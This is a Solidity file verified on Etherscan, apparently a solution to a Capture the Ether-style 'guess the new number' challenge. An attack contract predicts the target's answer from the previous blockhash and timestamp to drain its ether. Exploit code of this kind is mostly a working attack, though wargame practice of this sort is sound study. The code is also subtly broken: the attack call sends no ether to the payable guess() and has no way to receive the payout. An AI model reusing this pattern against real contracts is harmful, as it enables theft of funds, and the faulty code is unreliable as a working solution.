/**
 *Submitted for verification at Etherscan.io on 2022-09-07
*/

pragma solidity >=0.7.0 <0.9.0;
contract RanNumAttack{
     function Attack(address _address) public  {
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        GuessTheNewNumberChallenge(_address).guess(answer);
    }
}

contract GuessTheNewNumberChallenge {
     constructor() payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        if (n == answer) {
            payable(msg.sender).transfer(2 ether);
        }
    }
}